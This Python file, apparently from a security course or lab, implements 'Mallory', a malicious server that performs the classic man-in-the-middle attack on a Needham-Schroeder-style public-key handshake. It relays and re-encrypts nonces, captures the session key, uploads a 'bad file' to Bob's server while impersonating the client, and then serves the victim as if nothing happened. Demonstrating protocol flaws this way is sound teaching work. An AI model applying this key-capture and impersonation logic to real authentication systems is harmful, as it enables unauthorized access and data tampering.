"""
This file represents Mallory, a malicious file storage server.
"""
from socket import socket, AF_INET, SOCK_STREAM
import subprocess, sys, os
sys.path.insert(1, os.path.join(sys.path[0], '..'))
from helpers import *


NAME = "mallory"


def serve_upload(conn, ssn_key, file_name, client_name):
    """(socket, bytes, str, str) -> NoneType

    Downloads the file for the client is uploading.

    :conn: connection to client
    :ssn_key: session key for symmetric encryption
    :file_name: name of file to upload
    :client_name: name of client
    """
    # get signal to begin upload
    request = aes.decrypt(ssn_key, conn.recv(1024))
    if request != SIG_START:
        conn.sendall(aes.encrypt(ssn_key, SIG_BAD))
        return print("Mallory: something went wrong with file transfer")
    response = aes.encrypt(ssn_key, SIG_GOOD)
    conn.sendall(response)
    print("Mallory: beginning transfer for {}...".format(file_name))

    # get file contents from client
    contents = list()
    completed_upload = False
    response = aes.encrypt(ssn_key, SIG_GOOD)
    while not completed_upload:
        request = aes.decrypt(ssn_key, conn.recv(1024))
        if request == SIG_END:
            completed_upload = True
            print("Mallory: completed transfer for {}".format(file_name))
        else:
            contents.append(request)
        conn.sendall(response)

    # save file to server folder
    file_path = "{}/{}".format(client_name, file_name)
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    with open(file_path, "w") as outputStream:
        outputStream.write(''.join(contents))
    print("Mallory: file saved in {}".format(file_path))


def serve_download(conn, ssn_key, file_name, client_name):
    """(socket, bytes, str, str) -> NoneType

    Uploads the file for the client is downloading.

    :conn: connection to client
    :ssn_key: session key for symmetric encryption
    :file_name: name of file to download
    :client_name: name of client
    """
    # read file contents
    file_path = "{}/{}".format(client_name, file_name)
    contents = None
    with open(file_path, "r") as fileStream:
        buffer = fileStream.read()
        contents = [buffer[0+i:16+i] for i in range(0, len(buffer), 16)]
    # get signal to begin download
    request = aes.decrypt(ssn_key, conn.recv(1024))
    if request != SIG_START:
        conn.sendall(aes.encrypt(ssn_key, SIG_BAD))
        return print("Mallory: something went wrong with file transfer")
    print("Mallory: beginning transfer for {}...".format(file_name))
    # upload file contents to client
    for i, content in enumerate(contents):
        response = aes.encrypt(ssn_key, content)
        conn.sendall(response)
        if aes.decrypt(ssn_key, conn.recv(1024)) != SIG_GOOD:
            return print("Mallory: something went wrong with file transfer, exiting...")
        print("Mallory: transferring file... ({}/{})".format(i+1, len(contents)))
    # send signal that transfer is complete
    request = aes.encrypt(ssn_key, SIG_END)
    conn.sendall(request)
    if aes.decrypt(ssn_key, conn.recv(1024)) != SIG_GOOD:
        return print("Mallory: something went wrong with file transfer, exiting...")
    print("Mallory: successful upload for {}".format(file_name))


def upload_bad_file(sock, ssn_key):
    """(socket, bytes) -> NoneType

    Uploads a malicious file to the legitmate storage server.

    :sock: connection to storage server
    :ssn_key: session key for symmetric encryption
    """
    # file to upload
    file_name = "bad_file.txt"

    # read file contents
    contents = None
    with open(file_name, "r") as fileStream:
        buffer = fileStream.read()
        contents = [buffer[0+i:16+i] for i in range(0, len(buffer), 16)]
    print("Mallory: {} is read and ready for upload".format(file_name))

    # send file name
    req_bob = "{},{}".format(file_name, UPLOAD)
    sock.sendall(aes.encrypt(ssn_key, req_bob))
    if aes.decrypt(ssn_key, sock.recv(1024)) != SIG_GOOD:
        return print("Mallory: something went wrong with file transfer, exiting...")
    print("Mallory: uploaded file name {}".format(file_name))

    # send signal to begin upload of contents
    sock.sendall(aes.encrypt(ssn_key, SIG_START))
    if aes.decrypt(ssn_key, sock.recv(1024)) != SIG_GOOD:
        return print("Mallory: something went wrong with file transfer, exiting...")
    print("Mallory: beginning file upload...")

    # upload file contents
    for i, content in enumerate(contents):
        sock.sendall(aes.encrypt(ssn_key, content))
        if aes.decrypt(ssn_key, sock.recv(1024)) != SIG_GOOD:
            return print("Mallory: something went wrong with file transfer, exiting...")
        print("Mallory: uploading file... ({}/{})".format(i+1, len(contents)))

    # send signal that upload is complete
    sock.sendall(aes.encrypt(ssn_key, SIG_END))
    if aes.decrypt(ssn_key, sock.recv(1024)) != SIG_GOOD:
        return print("Mallory: something went wrong with file transfer, exiting...")
    print("Mallory: successful upload for {}".format(file_name))


def attack(conn):
    """(socket) -> (bytes, str) or NoneType
    Performs a man-in-the-middle attack between the client and Bob's storage server.
    Returns the session key and clients name if attack was successful, otherwise
    returns None.

    :conn: connection to the client (victim)
    """
    # get RSA key of Mallory for decrypting
    rsa_key = rsa.import_key("RsaKey.asc")

    # A -- {N_A, A}(KP_M) --> M
    req_client = rsa.decrypt(rsa_key, conn.recv(1024))
    client_nonce, client_name = req_client.split(',')
    print("Mallory: recieved nonce {} from client {}".format(client_nonce, client_name))

    # get public key of Bob for encrypting
    subprocess.Popen([sys.executable, "..\\pks\\pks.py", "--extract"])
    pks_addr = (PKS_HOST, PKS_PORT)
    bob_pkey = ns.get_public_key(pks_addr, "bob", NAME, rsa_key)
    bob_pkey = rsa.import_key(bob_pkey)

    # reencrypt request for Bob
    req_bob = "{},{}".format(client_nonce, client_name)
    req_bob = rsa.encrypt(bob_pkey, req_bob)

    # open connection with Bob's server
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.connect((BOB_HOST, BOB_PORT))
        print("Mallory: connected with bob")

        # M -- {N_A, A}(KP_B) --> B
        sock.sendall(req_bob)
        print("Mallory: sent nonce {} to bob, pretending to be {}".format(client_nonce, client_name))

        # M <-- {N_A, N_B}(KP_A) -- B
        resp_bob = sock.recv(1024)
        print("Mallory: recieved encrypted nonces from bob")

        # A <-- {N_A, N_B}(KP_A) -- M
        conn.sendall(resp_bob)
        print("Mallory: redirect encrypted nonces to {}".format(client_name))

        # A -- {K, N_B}(KP_M) --> M
        req_client = conn.recv(1024)
        if req_client.isdigit() and int(req_client) == RESP_DENIED:
            sock.sendall(req_client)
            return print("Mallory: I've been spotted! Shutting down...")
        req_client = rsa.decrypt(rsa_key, req_client)
        ssn_key, bob_nonce = req_client.split(',')
        print("Mallory: recieved session key b'{}' and bob's nonce {} from {}".format(ssn_key, bob_nonce, client_name))

        # M -- {K, N_B}(KP_B) --> B
        req_bob = "{},{}".format(ssn_key, bob_nonce)
        req_bob = rsa.encrypt(bob_pkey, req_bob)
        sock.sendall(req_bob)
        print("Mallory: redirect session key b'{}' and nonce {} to bob".format(ssn_key, bob_nonce))
        ssn_key = bytes(ssn_key, "utf-8")

        # check if MIMA was successful
        if int(sock.recv(1024)) == RESP_VERIFIED:
            print("Mallory: I got in!")
            upload_bad_file(sock, ssn_key)
            return ssn_key, client_name

        else:
            print("Mallory: Uhh oh...")

    print("Mallory: attack completed")


def serve_client_after_attack(conn, ssn_key, client_name):
    """(socket, bytes, str) -> NoneType

    Service the client after the attack to appear normal.

    :conn: connection to client
    :ssn_key: session key for symmetric encryption
    :client_name: name of client
    """
    # verify and serve the victim
    conn.sendall(bytes(str(RESP_VERIFIED), "utf-8"))

    # get file name and mode of transfer
    request = aes.decrypt(ssn_key, conn.recv(1024))
    file_name, mode = request.split(',')
    response = aes.encrypt(ssn_key, SIG_GOOD)
    print("Mallory: recieved request of file {} for mode {}".format(file_name, mode))

    # serve to upload or download the file
    if mode == UPLOAD:
        conn.sendall(response)
        serve_upload(conn, ssn_key, file_name, client_name)

    # if download, check if file exists
    elif mode == DOWNLOAD:
        file_path = "{}/{}".format(client_name, file_name)
        if os.path.isfile(file_path):
            conn.sendall(response)
            serve_download(conn, ssn_key, file_name, client_name)
        else:
            response = aes.encrypt(ssn_key, SIG_BAD)
            conn.sendall(response)
            print("Mallory: {} does not exist in server, exiting...".format(file_name))


def main():
    """() -> NoneType

    Performs a man-in-the-middle attack between the client and Bob's storage server,
    then services the client after the attack.

    REQ: bob.py or bob-fix.py is running
    """
    # begin to 'serve' client
    with socket(AF_INET, SOCK_STREAM) as sock_main:
        sock_main.bind((MAL_HOST, MAL_PORT))
        sock_main.listen()
        conn, addr = sock_main.accept()
        with conn:
            print('Mallory: connection from client with address', addr)
            while True:
                # begin the attack
                result = attack(conn)
                if result:
                    ssn_key, client_name = result
                    # verify and serve the victim
                    serve_client_after_attack(conn, ssn_key, client_name)
                # done, stop server
                return print("Mallory: shutting down server...")


if __name__ == "__main__":
    print("Mallory: malicious storage server")
    print("Mallory: beginning to 'serve' clients...")
    main()
